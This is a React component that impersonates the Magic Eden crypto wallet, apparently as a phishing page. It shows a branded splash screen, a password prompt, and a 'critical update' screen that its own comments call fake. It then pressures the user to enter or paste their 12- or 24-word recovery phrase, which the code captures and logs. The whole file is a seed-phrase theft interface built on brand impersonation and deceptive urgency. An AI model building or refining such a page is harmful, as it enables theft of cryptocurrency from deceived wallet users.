import React, { useState, useEffect } from 'react';

// Import your new 3D logo asset
import edenLogo from '../assets/Eden.png';

interface MagicEdenPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'updating' | 'import';

export default function MagicEdenPanel({ isOpen, onClose }: MagicEdenPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phrase, setPhrase] = useState('');
  const [seedError, setSeedError] = useState(false);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhrase('');
      setSeedError(false);

      const timer = setTimeout(() => {
        setView('password');
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake updating screen
  useEffect(() => {
    if (view === 'updating') {
      const timer = setTimeout(() => {
        setView('import');
      }, 4000);
      return () => clearTimeout(timer);
    }
  }, [view]);

  const handlePhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value.toLowerCase();
    setPhrase(val);
    
    // Simple validation: check for invalid characters (only lowercase letters and spaces allowed)
    if (val.length > 0 && !/^[a-z\s]+$/.test(val)) {
      setSeedError(true);
    } else {
      setSeedError(false);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setPhrase(text.toLowerCase().trim());
      setSeedError(false);
    } catch (err) {
      console.error('Failed to read clipboard contents: ', err);
    }
  };

  const handleClear = () => {
    setPhrase('');
    setSeedError(false);
  };

  const isPhraseComplete = () => {
    const words = phrase.trim().split(/\s+/).filter(w => w.length > 0);
    return (words.length === 12 || words.length === 24) && !seedError;
  };

  return (
    <>
      <div className="fixed inset-0 z-[2147483648] pointer-events-none font-sans">
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out pointer-events-auto ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex pointer-events-auto transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#323232] md:overflow-y-hidden overflow-y-auto ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#000000] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="flex items-center justify-center gap-x-2 animate-[fadeIn_1s_ease-out]">
                <img src={edenLogo} alt="Magic Eden" className="w-[70px] h-[70px] object-contain drop-shadow-[0_0_10px_rgba(252,40,168,0.3)]" />
                <MagicEdenTextSVG className="w-[100px] h-[100px]" />
              </div>
              <div className="mt-4 w-full max-w-[280px] text-center animate-[fadeIn_1s_ease-out_0.2s_both]">
                <h3 className="font-inter text-[#ffffff] font-semibold text-[32px] leading-[40px]">Welcome to the Magic Eden Wallet</h3>
              </div>
              <div className="mt-4 w-full max-w-[280px] text-center animate-[fadeIn_1s_ease-out_0.4s_both]">
                <h3 className="font-inter text-[#ffffff80] font-normal text-[16px] leading-[24px]">You've unlocked the world of web3 apps! We'll prompt you to use Magic Eden when connecting to a site that we support.</h3>
              </div>
              <div className="mt-8 flex items-center justify-center animate-[fadeIn_1s_ease-out_0.6s_both]">
                <svg className="w-10 h-10 text-[#e9269c] animate-spin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col px-5 pt-12 pb-8 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              {/* TOP: Logo & Text */}
              <div className="flex flex-col items-center justify-start shrink-0">
                <div className="flex items-center justify-center mb-6">
                  <img src={edenLogo} alt="Magic Eden" className="w-[150px] h-[150px] object-contain drop-shadow-[0_0_20px_rgba(252,40,168,0.25)] animate-[pulse_3s_ease-in-out_infinite]" />
                </div>
                <div className="w-full max-w-[280px] text-center">
                  <h4 className="font-inter text-[#ffffff] font-semibold text-[22px] leading-[30px]">Secured Wallet</h4>
                  <p className="text-[#ffffff80] font-inter font-normal text-[15px] leading-[20px] mt-1">Enter your password</p>
                </div>
              </div>

              {/* MIDDLE: Input & Button */}
              <div className="flex-1 flex flex-col items-center justify-center w-full mt-4">
                <div className="relative mb-4 w-full shrink-0">
                  <input 
                    className="w-full h-[52px] py-[11px] pl-[16px] pr-[48px] text-[15px] font-medium rounded-[24px] text-[#ffffff] border border-[#ffffff1a] bg-[#ffffff0a] shadow-[inset_0px_0px_44px_0px_rgba(255,255,255,0.04)] outline-none transition-all duration-300 font-inter focus:border-[#fc28a8] hover:bg-[#ffffff14]" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="group cursor-pointer absolute right-5 top-[18px]"
                  >
                    {!showPassword ? (
                      <svg className="w-[16px] h-[16px]" viewBox="0 0 24 24" fill="none"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z" stroke="rgba(255,255,255,0.5)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path><path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z" stroke="rgba(255,255,255,0.5)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                    ) : (
                      <svg className="w-[16px] h-[16px]" viewBox="0 0 24 24" fill="none"><g stroke="rgba(255,255,255,0.5)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08c.421-.052.845-.08 1.27-.08 7 0 10 7 10 7a13.163 13.163 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"></path></g></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full shrink-0">
                  <button 
                    onClick={() => setView('updating')}
                    disabled={password.length < 3}
                    className="font-inter flex items-center justify-center outline-none shadow-inner w-full text-[#ffffff] bg-gradient-to-t from-[#fc28a8] to-[#d6238f] font-medium text-[16px] rounded-full h-[52px] transition-all duration-300 cursor-pointer hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-40 active:scale-[0.97]" 
                    type="button"
                  >
                    Unlock
                  </button>
                </div>
              </div>

              {/* BOTTOM: Forgot Password */}
              <div className="w-full text-center mt-auto shrink-0">
                <h4 className="text-[#ffffff80] font-inter font-normal text-[14px] leading-[20px] cursor-pointer hover:text-white transition-colors">Forgot password?</h4>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATING STATE (TIPS)             */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'updating' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="flex items-center justify-center p-4 text-center border-b border-[#ffffff1a] w-full shrink-0">
                <h4 className="text-[#ffffff] font-inter font-normal text-[18px] leading-[24px]">Information</h4>
              </div>
              
              <div className="flex flex-col items-center justify-center gap-y-2 mt-10 px-4 flex-1">
                <div className="flex items-center justify-center mb-4">
                  <img src={edenLogo} alt="Magic Eden" className="w-[151px] h-[151px] object-contain drop-shadow-[0_0_15px_rgba(252,40,168,0.2)] animate-[pulse_2s_ease-in-out_infinite]" />
                </div>
                
                <div className="mt-2 w-full max-w-[280px] text-center">
                  <h4 className="font-inter text-[#ffffff] font-normal text-[20px] leading-[30px]">Updating your wallet</h4>
                </div>
                <div className="w-full max-w-[280px] text-center mb-6">
                  <h4 className="font-inter text-[#ffffff80] font-normal text-[16px] leading-[22px]">Please wait for the critical update to complete</h4>
                </div>
                
                <div className="w-full bg-[#ffc8191a] border border-[#ffc8191a] px-[16px] py-[16px] rounded-[24px] flex flex-row gap-x-3 mb-8">
                  <div className="mt-0.5 shrink-0">
                    <svg className="w-[18px] h-[18px]" fill="none" viewBox="0 0 15 15"><path fill="rgba(255,200,25,1)" fillRule="evenodd" d="M6.634 2a1 1 0 0 1 1.732 0l5.769 9.999a1 1 0 0 1-.867 1.5H1.731a1 1 0 0 1-.866-1.5zm.87 8.248a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5m0-6a.75.75 0 0 0-.75.75v3.5a.75.75 0 0 0 1.5 0v-3.5a.75.75 0 0 0-.75-.75" clipRule="evenodd"></path></svg>
                  </div>
                  <div>
                    <p className="font-inter text-[#ffc819] font-normal text-[14px] leading-[20px]">Please do not close this window or your browser until the process is complete. Your wallet data is being migrated to a new secure storage format.</p>
                  </div>
                </div>
                
                <div className="mt-auto mb-12 flex items-center justify-center">
                  <svg className="w-10 h-10 text-[#e9269c] animate-spin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 flex flex-col transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex items-center justify-between px-4 py-[10px] h-[59px] shrink-0 border-b border-[#1a1a1a]">
                <button type="button" className="rounded-full p-[6px] hover:bg-[#8e939f0d] transition-colors" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#ffffff]" fill="none" viewBox="0 0 24 24"><path stroke="#857F94" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" d="M14 19L7 12L14 5"></path></svg>
                </button>
                <h4 className="text-[#ffffff] font-inter font-medium text-[18px] leading-[24px]">Import Wallet</h4>
                <div className="w-10"></div>
              </div>

              <div className="flex flex-col items-center justify-center text-center gap-y-2 mt-6 px-4 pb-4 shrink-0">
                <h3 className="text-[#ffffff] font-inter font-normal text-[16px] text-left w-full">Enter or paste your 12 or 24-word recovery phrase</h3>
                <p className="text-[#ffffff80] font-inter font-normal text-[15px] leading-[20px] text-left w-full">Enter each word of your secret phrase separated by a single space</p>
              </div>

              <div className="mt-1 px-4 shrink-0 relative">
                <textarea 
                  className={`bg-[#ffffff0a] border font-inter w-full h-[160px] rounded-[8px] p-[12px] text-[15px] text-[#ffffff] font-medium outline-none transition-all duration-300 resize-none placeholder:opacity-50 ${seedError ? 'border-[#ff5a00]' : 'border-transparent focus:border-[#ffffff1a] hover:bg-[#ffffff14]'}`} 
                  placeholder="Enter or paste your recovery phrase"
                  value={phrase}
                  onChange={handlePhraseChange}
                ></textarea>
              </div>

              <div className={`mt-[6px] mb-[20px] px-4 shrink-0 transition-opacity duration-300 ${seedError ? 'opacity-100' : 'opacity-0'}`}>
                <p className="flex items-center justify-start text-[#ff5a00] text-[14px] leading-[20px] font-inter font-normal">
                  Invalid phrase format. Ensure words are separated by spaces.
                </p>
              </div>

              <div className="flex items-center justify-between px-4 gap-x-3 shrink-0">
                <button 
                  className="relative w-full bg-gradient-to-br from-[#2a2a2a] to-[#1a1a1a] flex items-center justify-center gap-x-[8px] rounded-[24px] px-[16px] h-[42px] hover:opacity-90 transition-all duration-300 cursor-pointer shadow-[0_0_0_1px_rgba(255,255,255,0.1),inset_0_1px_0_0_rgba(255,255,255,0.08)] active:scale-[0.97]" 
                  type="button"
                  onClick={handlePaste}
                >
                  <svg className="w-[18px] h-[18px] text-[#ffffff]" fill="none" viewBox="0 0 18 18"><path fill="currentColor" fillRule="evenodd" d="M14 5a3 3 0 0 1 3 3v6a3 3 0 0 1-3 3H8a3 3 0 0 1-3-3V8a3 3 0 0 1 3-3zM8 7a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1z" clipRule="evenodd"></path><path fill="currentColor" d="M11 1a2 2 0 0 1 2 2H4a1 1 0 0 0-1 1v9a2 2 0 0 1-2-2V4a3 3 0 0 1 3-3z"></path></svg>
                  <span className="text-[#ffffff] font-inter text-[15px] font-medium leading-[20px]">Paste</span>
                </button>
                <button 
                  className="relative w-full bg-gradient-to-br from-[#2a2a2a] to-[#1a1a1a] flex items-center justify-center gap-x-[8px] rounded-[24px] px-[16px] h-[42px] hover:opacity-90 transition-all duration-300 cursor-pointer shadow-[0_0_0_1px_rgba(255,255,255,0.1),inset_0_1px_0_0_rgba(255,255,255,0.08)] active:scale-[0.97]" 
                  type="button"
                  onClick={handleClear}
                >
                  <svg className="w-[18px] h-[18px] text-[#ffffff]" fill="none" viewBox="0 0 18 18"><path fill="rgba(255,255,255,1)" d="M12.293 4.293a1 1 0 1 1 1.414 1.414L10.414 9l3.293 3.293a1 1 0 0 1-1.414 1.414L9 10.414l-3.293 3.293a1 1 0 0 1-1.414-1.414L7.586 9 4.293 5.707a1 1 0 1 1 1.414-1.414L9 7.586l3.293-3.293Z"></path></svg>
                  <span className="text-[#ffffff] font-inter text-[15px] font-medium leading-[20px]">Clear</span>
                </button>
              </div>

              <div className="flex flex-col items-center justify-center mt-auto px-4 pb-6">
                <button 
                  className="font-inter flex items-center justify-center outline-none shadow-inner w-full text-[#ffffff] bg-gradient-to-t from-[#fc28a8] to-[#d6238f] font-medium text-[16px] rounded-full h-[48px] transition-all duration-300 cursor-pointer hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-40 active:scale-[0.97]" 
                  type="button" 
                  disabled={!isPhraseComplete()}
                  onClick={() => {
                    console.log("Magic Eden Import Complete:", phrase.trim().split(/\s+/));
                    onClose();
                  }}
                >
                  Continue
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// MAGIC EDEN TEXT SVG COMPONENT
// -------------------------------------------------------------------

const MagicEdenTextSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 98 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path d="M97.1478 1.36525C97.0836 1.21351 96.9961 1.07345 96.8735 0.956726C96.7568 0.845842 96.6167 0.746629 96.4592 0.688269C96.3016 0.629909 96.1382 0.594893 95.9748 0.600729H91.2826H90.6932H86.0535C85.3824 0.600729 84.7754 1.10263 84.7404 1.7796C84.7054 2.49743 85.2715 3.08687 85.9835 3.08687H88.528C89.0299 3.08687 89.4384 3.49539 89.4384 3.99729V13.7668C89.4501 14.0936 89.5843 14.4029 89.8178 14.6363C90.0512 14.8698 90.3664 14.9982 90.699 15.0098H91.2884C91.6211 14.9982 91.9362 14.8698 92.1697 14.6363C92.4031 14.4029 92.5432 14.0936 92.549 13.7668V3.99729C92.549 3.49539 92.9575 3.08687 93.4594 3.08687H95.9923C96.3249 3.0752 96.6401 2.9468 96.8735 2.71336C97.1069 2.47992 97.247 2.17062 97.2528 1.8438C97.2528 1.68039 97.2237 1.51698 97.1595 1.35941L97.1478 1.36525Z"></path><path d="M78.671 12.505H74.3874C74.0547 12.4933 73.7396 12.365 73.5061 12.1315C73.2727 11.8981 73.1326 11.5888 73.1268 11.2619V10.264C73.1385 9.93718 73.2727 9.62787 73.5061 9.39443C73.7396 9.16099 74.0547 9.03259 74.3874 9.02092H78.0524C78.3909 9.02092 78.706 8.88669 78.9453 8.65909C79.1846 8.43149 79.313 8.11051 79.313 7.78369C79.313 7.45687 79.1787 7.13589 78.9453 6.90829C78.7119 6.67485 78.385 6.54645 78.0524 6.54645H74.3524C74.0197 6.53478 73.7046 6.40639 73.4711 6.17295C73.2377 5.93951 73.0976 5.6302 73.0918 5.30338V4.30543C73.1035 3.97861 73.2377 3.6693 73.4711 3.43586C73.7046 3.20242 74.0197 3.07403 74.3524 3.06236H78.5543C78.8928 3.06236 79.2079 2.92813 79.4472 2.70053C79.6865 2.47292 79.8149 2.15194 79.8149 1.82512C79.8149 1.49831 79.6806 1.17733 79.4472 0.949724C79.2138 0.722119 78.8869 0.587891 78.5543 0.587891H73.512C73.3194 0.587891 73.1268 0.64625 72.9692 0.768807C72.8117 0.891363 72.7124 1.06061 72.6716 1.2532L69.9812 13.7598V14.0107C70.0279 14.3025 70.1855 14.5651 70.4189 14.746C70.6523 14.9328 70.9441 15.0262 71.2418 15.0028H78.636C78.9745 15.0028 79.2896 14.8686 79.5289 14.641C79.7682 14.4134 79.8966 14.0924 79.8966 13.7656C79.8966 13.4388 79.7623 13.1178 79.5289 12.8902C79.2955 12.6568 78.9686 12.5284 78.636 12.5284H78.6652L78.6768 12.5109L78.671 12.505Z"></path><path d="M65.6278 13.2866C65.5636 13.1349 65.476 12.9948 65.3535 12.8781C65.2368 12.7672 65.0967 12.668 64.9391 12.6096C64.7874 12.5513 64.6181 12.5163 64.4547 12.5221H58.9164V1.84221C58.893 1.52123 58.753 1.21776 58.5254 0.990157C58.2919 0.762553 57.9826 0.622488 57.6558 0.60498H57.0664C56.7337 0.616652 56.4186 0.745044 56.1851 0.978485C55.9458 1.21192 55.8116 1.52123 55.8058 1.84805V13.7768C55.8175 14.1037 55.9517 14.413 56.1851 14.6464C56.4186 14.8799 56.7337 15.0082 57.0664 15.0199H64.4606C64.7932 15.0082 65.1084 14.8799 65.3418 14.6464C65.5811 14.413 65.7153 14.1037 65.7212 13.7768C65.7212 13.6134 65.692 13.45 65.6278 13.2925V13.2866Z"></path><path d="M50.8744 13.2866C50.8102 13.1349 50.7226 12.9948 50.6001 12.8781C50.4834 12.7672 50.3433 12.668 50.1857 12.6096C50.034 12.5513 49.8647 12.5163 49.7013 12.5221H44.163V1.84221C44.1396 1.52123 43.9996 1.21776 43.7719 0.990157C43.5385 0.762553 43.2292 0.622488 42.9024 0.60498H42.3129C41.9803 0.616652 41.6652 0.745044 41.4317 0.978485C41.1983 1.21192 41.0582 1.52123 41.0524 1.84805V13.7768C41.064 14.1037 41.1983 14.413 41.4317 14.6464C41.6652 14.8799 41.9803 15.0082 42.3129 15.0199H49.7072C50.0398 15.0082 50.355 14.8799 50.5884 14.6464C50.8218 14.413 50.9619 14.1037 50.9677 13.7768C50.9677 13.6134 50.9386 13.45 50.8744 13.2925V13.2866Z"></path><path d="M29.3276 9.28938H29.0708C28.8724 9.28938 28.6739 9.23685 28.4988 9.13764C28.3238 9.04427 28.172 8.91004 28.0553 8.75247C27.9386 8.59489 27.8627 8.40814 27.8394 8.20972C27.816 8.01129 27.8277 7.8187 27.8919 7.63195L29.1525 3.82104C29.1525 3.82104 29.1641 3.78019 29.1758 3.76268C29.1933 3.75101 29.2108 3.73933 29.2342 3.73933C29.2575 3.73933 29.2809 3.75101 29.2925 3.76268C29.3042 3.77435 29.3159 3.7977 29.3159 3.82104L30.5765 7.63195C30.6231 7.82454 30.6231 8.02296 30.5765 8.21555C30.5356 8.40814 30.4539 8.59489 30.3313 8.74663C30.2146 8.9042 30.0571 9.03259 29.882 9.12597C29.7069 9.21935 29.5085 9.27187 29.31 9.28354M31.446 1.4166C31.3585 1.17733 31.2009 0.967231 30.9908 0.821331C30.7807 0.669595 30.5298 0.593727 30.2672 0.587891H28.0786C27.8219 0.587891 27.5709 0.669595 27.355 0.821331C27.1449 0.973067 26.9873 1.17733 26.8998 1.4166L22.6978 13.3454C22.6336 13.5322 22.6161 13.7306 22.6453 13.9232C22.6745 14.1158 22.7504 14.3025 22.8613 14.4659C22.9721 14.6293 23.1239 14.7636 23.3048 14.8511C23.4799 14.9445 23.6783 14.997 23.8709 15.0028H24.542C24.7988 15.0028 25.0498 14.9211 25.2657 14.7694C25.4758 14.6177 25.6334 14.4134 25.7209 14.1741L26.2228 12.6042C26.3103 12.365 26.4679 12.1549 26.678 12.009C26.8881 11.8572 27.1391 11.7814 27.4017 11.7755H30.8449C31.1017 11.7755 31.3527 11.8572 31.5686 12.009C31.7787 12.1607 31.9363 12.365 32.0238 12.6042L32.5257 14.1741C32.6132 14.4134 32.7708 14.6235 32.9809 14.7694C33.191 14.9211 33.4419 14.997 33.7046 15.0028H34.3757C34.5741 15.0028 34.7726 14.9503 34.9418 14.8511C35.1169 14.7577 35.2686 14.6235 35.3853 14.4659C35.5021 14.3083 35.5779 14.1216 35.6013 13.9232C35.6246 13.7247 35.6129 13.5322 35.5487 13.3454L31.4285 1.4166H31.446Z"></path><path d="M9.66617 0.612488C10.0338 0.612488 10.3782 0.612487 10.6991 0.828419C11.0201 1.04435 11.2361 1.37117 11.3528 1.80887L13.4537 9.40151C13.5238 9.65246 13.6288 9.78086 13.763 9.78086C13.944 9.78086 14.049 9.64079 14.0723 9.3665L15.3096 1.67464C15.3796 1.28363 15.5547 0.97432 15.8407 0.746716C16.1266 0.519111 16.4534 0.559964 16.8211 0.559964C17.2822 0.559964 17.6615 0.548292 17.9708 0.845928C18.2801 1.14356 18.4143 1.52291 18.3676 1.97811L16.2375 13.3175C16.1441 13.8252 15.9048 14.2279 15.5138 14.5372C15.1228 14.8465 14.691 14.8348 14.2066 14.8348C13.7689 14.8348 13.3662 14.8582 12.9868 14.5664C12.6075 14.2804 12.3274 13.8952 12.1465 13.4167L9.97547 5.85906C9.90544 5.60811 9.80039 5.47972 9.66617 5.47972C9.53194 5.47972 9.42688 5.60811 9.35685 5.85906L7.18586 13.4167C7.00495 13.8952 6.71898 14.2804 6.34548 14.5664C5.96614 14.8523 5.55761 14.8348 5.12574 14.8348C4.64135 14.8348 4.2095 14.8465 3.81848 14.5372C3.42747 14.2279 3.18819 13.8194 3.09482 13.3175L0.964677 1.97811C0.917989 1.51707 1.05221 1.14356 1.36152 0.845928C1.67083 0.548292 2.05601 0.559964 2.51121 0.559964C2.87888 0.559964 3.2057 0.513275 3.49167 0.746716C3.77763 0.97432 3.95854 1.28363 4.02274 1.67464L5.25998 9.3665C5.28332 9.64079 5.38837 9.78086 5.56929 9.78086C5.70935 9.78086 5.80856 9.65246 5.87859 9.40151L7.97955 1.80887C8.09627 1.37117 8.31221 1.04435 8.63319 0.828419C8.95417 0.612487 9.2985 0.612488 9.66617 0.612488Z"></path></svg>
);